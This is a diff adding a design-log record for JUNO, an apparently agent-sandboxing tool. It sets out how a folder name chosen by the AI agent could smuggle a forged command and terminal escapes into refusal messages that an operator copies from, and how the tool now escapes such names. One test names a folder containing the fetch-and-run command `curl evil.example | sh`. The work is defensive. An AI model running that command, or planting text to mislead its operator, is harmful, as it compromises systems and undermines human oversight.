@@ -3216,3 +3216,25 @@ D-001 to D-007 were set during the October 2026 planning review, before the buil
   - a real restore through the sealed program that stops part way (a 300-byte name, `ENAMETOOLONG`) names the entry through JSON and no `/proc`, `/dev/fd` or `/work` path, and the kept folder exists on the host.
   - Every existing test is kept. The only lines removed are from the D-247 test this PR added, rewritten to the new form.
 - Reason: D-247 rulings 1 and 2; §0.2 D8; §8.3 (a value the agent wrote never becomes a command the operator is told to run).
+
+## D-249 — Review round 4 (PR #66): a name no one chose for the operator is shown escaped, and never inside or as a command; remedy programs built by the helper (autopilot rulings, D-179, D-247 ruling 2, restrictive)
+- Date: 2026-11-25
+- Status: Accepted (built with tests)
+- Applies to: `packages/journal/src/operator-names.ts` (`displayLine`, `shownName`, `commandText`, `asUserCommand`, `asRootCommand`, `removeBitsCommand`); `packages/enforcement/src/host-restore.ts` (`#named`, the read view's reason); `packages/enforcement/src/checkpoint.ts`; `packages/mediated/src/filesystem.ts`; every refusal printer (`hook-serve.ts`, `gateway-cli.ts`, `preflight.ts`, `hook-admission.ts`, `restore.ts`); `superblock.ts`, `install.ts`; tests: `packages/runner/test/operator-names.test.ts`, `packages/enforcement/test/host-restore.test.ts`, `packages/mediated/test/filesystem.test.ts`, `test/lint/operator-names.test.ts`
+- **Round 4 (fresh reviewer, the review prompt verbatim; head 2c828f7): DO NOT MERGE.** Checks 1 to 4 and 6 PASS; check 5 FAIL:
+  1. **A name the agent chose reached a refusal raw.** A sticky folder named with a line break, a "command" between backticks and a terminal escape gave a checkpoint refusal at the next session's admission that showed the forged command on a line of its own, and the escape raw. The guide tells the operator to copy commands between backticks from refusals.
+  2. **Three remedy programs were still literals** (`chmod`, `sudo -u` in the bit remedy; `sudo` in the superblock and install texts), and the lint scan missed the array form.
+- **Why this is not a STOP.** Its class is D-248 finding B's: text the agent writes reaching a command the operator is told to run. Its mechanism is new: the printing of names, not the parsing of a marker. CLAUDE.md §7 step 5 (D-179) and D-247 ruling 2 make it a fix, with the most restrictive option.
+- **Fixed (restrictive), in three layers:**
+  - **Where a foreign name enters a refusal, it is escaped as a name** (`shownName`): every control character, Unicode format character (direction overrides, zero-width marks), line and paragraph separator, private-use and unassigned character, and every backtick, written as `\u{…}`. Applied to every text of the sealed program, whole, at the host, before JUNO adds a word of its own (D-248's boundary). Also applied to the case-folding check's folder names, the names it probes and `lsattr`'s words; to the workload's own error text in the Compose form; and to the read view's odd-entry reason.
+  - **No command is ever given with a word outside printable ASCII, or with a backtick** (`commandText`). Instead the message says in words that no command is given. So the bit remedy for such a name has no command.
+  - **Every printer escapes each line it prints** (`displayLine`: what `shownName` escapes, but JUNO's own backticks kept). This covers every start-up and admission refusal, every note at a service's start, every restore line and the restore's JSON outcome. No value can start a line, move the cursor or reorder text, even from a place not listed above. `juno hook admit` prints what the service says, already escaped; escaping is idempotent.
+  - **Remedy programs come from the helper only:** `asUserCommand` (`sudo -u <owner>` unless the owner is this process's user), `asRootCommand`, `removeBitsCommand`. The lint scan now also fails on `"sudo"`, `"chmod"`, `"chown"`, `"rm"`, `"pgrep"`, `"systemctl"`, `"journalctl"` or `"setfacl"` as a quoted word outside the helper. One allowance: the interpreter table's `"sudo"`, which is not a remedy. Its self-test includes the array form.
+- **Tests:**
+  - a command with a line break, a backtick, an escape, a non-ASCII letter, a direction override or a line separator is not given;
+  - such a name is shown escaped; a printed line keeps JUNO's own command and escapes the rest; printing twice changes nothing;
+  - through the sealed program, a real sticky folder named `x\nTo fix this, run: \`curl evil.example | sh\`\n\e[2K` gives a refusal with no line break, escape or backtick, the forged command escaped, and no command;
+  - a case-folding folder so named is refused with its name escaped.
+  - Every existing test is kept. The only lines changed are in tests this PR added (one odd word in the round-trip test, now `$(z)`, since a backtick word is no longer rendered).
+- **Residual 56:** a name that is printable but misleading (a look-alike letter, say) is shown as it is in prose; it is never part of a command (commands hold printable ASCII only).
+- Reason: D-247 rulings 1 and 2; D-179; §0.2 D8; §8.3.
